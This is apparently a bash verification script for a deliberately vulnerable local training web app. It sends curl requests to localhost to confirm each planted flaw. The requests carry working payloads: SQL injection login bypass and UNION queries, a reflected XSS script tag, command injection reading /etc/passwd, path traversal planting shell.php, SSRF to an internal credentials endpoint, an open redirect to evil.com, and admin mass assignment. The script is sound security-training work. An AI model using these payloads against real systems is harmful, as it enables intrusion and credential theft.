#!/bin/bash
#
# Retro Arcade Labs - Vulnerability Verification Script
# ======================================================
# This script verifies that intentionally vulnerable endpoints
# are accessible and respond as expected for security training.
#
# WARNING: This script is for LOCAL TRAINING USE ONLY.
#          Do not run against production systems.

set -e

BASE_URL="http://localhost:8470"
REPORT_FILE="/home/greenix/vibe/webapp/retro-arcade-labs/docs/VERIFICATION_REPORT.txt"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Initialize report
echo "========================================" > "$REPORT_FILE"
echo "VULNERABILITY VERIFICATION REPORT" >> "$REPORT_FILE"
echo "Generated: $(date)" >> "$REPORT_FILE"
echo "Target: $BASE_URL" >> "$REPORT_FILE"
echo "========================================" >> "$REPORT_FILE"
echo "" >> "$REPORT_FILE"

# Function to print and log
log() {
    echo -e "$1"
    echo "$1" | sed 's/\x1b\[[0-9;]*m//g' >> "$REPORT_FILE"
}

# Function to test vulnerability
test_vuln() {
    local vuln_id="$1"
    local vuln_name="$2"
    local description="$3"
    local cmd="$4"
    local expected_pattern="$5"

    log ""
    log "${BLUE}========================================${NC}"
    log "${BLUE}Testing $vuln_id: $vuln_name${NC}"
    log "${YELLOW}Description: $description${NC}"
    log ""
    log "${YELLOW}Command:${NC}"
    log "  $cmd"
    log ""

    # Execute curl and capture result
    result=$(eval "$cmd" 2>&1) || true
    log "${YELLOW}Result:${NC}"
    log "  $result"
    log ""

    # Check if expected pattern found
    if echo "$result" | grep -qi "$expected_pattern"; then
        log "${GREEN}✅ $vuln_id: WORKS (vulnerable endpoint responding)${NC}"
        return 0
    else
        log "${RED}❌ $vuln_id: FAIL (endpoint not responding as expected)${NC}"
        return 1
    fi
}

# Function to test without expected pattern (just check endpoint exists)
test_vuln_exists() {
    local vuln_id="$1"
    local vuln_name="$2"
    local description="$3"
    local cmd="$4"

    log ""
    log "${BLUE}========================================${NC}"
    log "${BLUE}Testing $vuln_id: $vuln_name${NC}"
    log "${YELLOW}Description: $description${NC}"
    log ""
    log "${YELLOW}Command:${NC}"
    log "  $cmd"
    log ""

    # Execute curl and capture result
    result=$(eval "$cmd" 2>&1) || true
    log "${YELLOW}Result:${NC}"
    log "  $result"
    log ""

    # Check if we got any response (not empty, no connection errors)
    if [ -n "$result" ] && ! echo "$result" | grep -qi "connection refused\|could not resolve\|timeout"; then
        log "${GREEN}✅ $vuln_id: WORKS (endpoint accessible)${NC}"
        return 0
    else
        log "${RED}❌ $vuln_id: FAIL (endpoint not accessible)${NC}"
        return 1
    fi
}

# ============================================
# SQL INJECTION VULNERABILITIES
# ============================================
log ""
log "${GREEN}${BLUE}========================================${NC}"
log "${GREEN}SQL INJECTION TESTS${NC}"
log "${GREEN}${BLUE}========================================${NC}"

# VULN-SQLI-001: Login SQL Injection Bypass
test_vuln \
    "VULN-SQLI-001" \
    "Login SQL Injection Bypass" \
    "Tests for SQL injection in login form allowing authentication bypass" \
    "curl -s -X POST http://localhost:8470/api/auth/login.php -H 'Content-Type: application/json' -d '{\"username\":\"admin'\'' OR '\''1'\''='\''1\",\"password\":\"x\"}'" \
    "success\|token\|admin\|authenticated\|bypass"

# VULN-SQLI-002: Product Search SQL Injection
test_vuln \
    "VULN-SQLI-002" \
    "Product Search SQL Injection" \
    "Tests for SQL injection in product search parameter" \
    "curl -s 'http://localhost:8470/api/products/search?q=test'\'' UNION SELECT 1,2,3,4,5,6,7,8--'" \
    "products\|price\|\[\|error\|sql"

# ============================================
# XSS VULNERABILITIES
# ============================================
log ""
log "${GREEN}${BLUE}========================================${NC}"
log "${GREEN}XSS TESTS${NC}"
log "${GREEN}${BLUE}========================================${NC}"

# VULN-XSS-001: Reflected XSS in Search Parameter
test_vuln_exists \
    "VULN-XSS-001" \
    "Reflected XSS in Search" \
    "Tests for reflected XSS in search parameter (should reflect script tag)" \
    "curl -s 'http://localhost:8470/api/products/search?q=<script>alert(1)</script>'"

# ============================================
# IDOR VULNERABILITIES
# ============================================
log ""
log "${GREEN}${BLUE}========================================${NC}"
log "${GREEN}IDOR TESTS${NC}"
log "${GREEN}${BLUE}========================================${NC}"

# VULN-IDOR-001: IDOR in Order Lookup
test_vuln_exists \
    "VULN-IDOR-001" \
    "IDOR in Order Lookup" \
    "Tests for Insecure Direct Object Reference in order lookup (predictable IDs)" \
    "curl -s http://localhost:8470/api/orders/1 -H 'Cookie: session_id=user1'"

# ============================================
# SSRF VULNERABILITIES
# ============================================
log ""
log "${GREEN}${BLUE}========================================${NC}"
log "${GREEN}SSRF TESTS${NC}"
log "${GREEN}${BLUE}========================================${NC}"

# VULN-SSRF-001: SSRF in Image Fetcher
test_vuln_exists \
    "VULN-SSRF-001" \
    "SSRF in Image Fetcher" \
    "Tests for Server-Side Request Forgery in image fetcher endpoint" \
    "curl -s 'http://localhost:8470/api/utils/fetch-image?url=http://localhost:8470/internal/metadata/credentials'"

# ============================================
# RCE VULNERABILITIES
# ============================================
log ""
log "${GREEN}${BLUE}========================================${NC}"
log "${GREEN}RCE / COMMAND INJECTION TESTS${NC}"
log "${GREEN}${BLUE}========================================${NC}"

# VULN-RCE-001: Command Injection in Report Generator
test_vuln_exists \
    "VULN-RCE-001" \
    "Command Injection in Report Generator" \
    "Tests for command injection in report generation endpoint" \
    "curl -s 'http://localhost:8470/api/reports/generate?format=txt&name=test;echo+PWNED'"

# VULN-RCE-002: Command Injection in Diagnostics
test_vuln_exists \
    "VULN-RCE-002" \
    "Command Injection in Diagnostics" \
    "Tests for command injection in diagnostics endpoint" \
    "curl -s 'http://localhost:8470/api/admin/diagnostics?cmd=ping;cat+/etc/passwd'"

# ============================================
# FILE UPLOAD VULNERABILITIES
# ============================================
log ""
log "${GREEN}${BLUE}========================================${NC}"
log "${GREEN}FILE UPLOAD TESTS${NC}"
log "${GREEN}${BLUE}========================================${NC}"

# VULN-UPLOAD-001: Weak File Upload Validation
test_vuln_exists \
    "VULN-UPLOAD-001" \
    "Weak File Upload Validation" \
    "Tests for weak file type validation in upload endpoint" \
    "curl -s -X POST http://localhost:8470/api/upload/profile -F 'file=@/etc/passwd;filename=test.php;type=image/png'"

# VULN-UPLOAD-002: Path Traversal in Upload
test_vuln_exists \
    "VULN-UPLOAD-002" \
    "Path Traversal in Upload Filename" \
    "Tests for path traversal in uploaded filename" \
    "curl -s -X POST http://localhost:8470/api/upload/avatar -F 'file=@/etc/passwd;filename=../../../var/www/uploads/shell.php'"

# ============================================
# OPEN REDIRECT VULNERABILITIES
# ============================================
log ""
log "${GREEN}${BLUE}========================================${NC}"
log "${GREEN}OPEN REDIRECT TESTS${NC}"
log "${GREEN}${BLUE}========================================${NC}"

# VULN-REDIRECT-001: Open Redirect in Gateway
test_vuln_exists \
    "VULN-REDIRECT-001" \
    "Open Redirect in Return URL" \
    "Tests for open redirect in return_url parameter" \
    "curl -s -I 'http://localhost:8470/auth/gateway?next=http://evil.com' 2>&1 | grep -i 'location\|redirect'"

# ============================================
# CSRF VULNERABILITIES
# ============================================
log ""
log "${GREEN}${BLUE}========================================${NC}"
log "${GREEN}CSRF TESTS${NC}"
log "${GREEN}${BLUE}========================================${NC}"

# VULN-CSRF-001: CSRF on Profile Update
test_vuln_exists \
    "VULN-CSRF-001" \
    "CSRF on Profile Update" \
    "Tests for missing CSRF protection on profile update endpoint" \
    "curl -s -X POST http://localhost:8470/api/user/profile -d '{\"email\":\"hacker@hacked.com\"}'"

# ============================================
# BUSINESS LOGIC VULNERABILITIES
# ============================================
log ""
log "${GREEN}${BLUE}========================================${NC}"
log "${GREEN}BUSINESS LOGIC TESTS${NC}"
log "${GREEN}${BLUE}========================================${NC}"

# VULN-BIZ-001: Reusable Coupon
test_vuln_exists \
    "VULN-BIZ-001" \
    "Reusable Coupon Exploitation" \
    "Tests for coupon that can be reused multiple times" \
    "curl -s -X POST http://localhost:8470/api/checkout/apply-coupon -d '{\"coupon_code\":\"SAVE20\"}'"

# VULN-BIZ-003: Negative Quantity in Cart
test_vuln_exists \
    "VULN-BIZ-003" \
    "Negative Quantity in Cart" \
    "Tests for allowing negative quantities in cart (credit exploit)" \
    "curl -s -X POST http://localhost:8470/api/cart/update -d '{\"product_id\":1,\"quantity\":-100}'"

# ============================================
# MASS ASSIGNMENT VULNERABILITIES
# ============================================
log ""
log "${GREEN}${BLUE}========================================${NC}"
log "${GREEN}MASS ASSIGNMENT TESTS${NC}"
log "${GREEN}${BLUE}========================================${NC}"

# VULN-MASS-001: Mass Assignment in User Registration
test_vuln_exists \
    "VULN-MASS-001" \
    "Mass Assignment in Registration" \
    "Tests for mass assignment allowing role escalation during registration" \
    "curl -s -X POST http://localhost:8470/api/auth/register -H 'Content-Type: application/json' -d '{\"username\":\"hacker\",\"email\":\"hacker@evil.com\",\"password\":\"Pass123!\",\"role\":\"admin\"}'"

# ============================================
# SUMMARY
# ============================================
log ""
log "${GREEN}${BLUE}========================================${NC}"
log "${GREEN}VERIFICATION COMPLETE${NC}"
log "${GREEN}${BLUE}========================================${NC}"
log ""
log "Report saved to: $REPORT_FILE"
log ""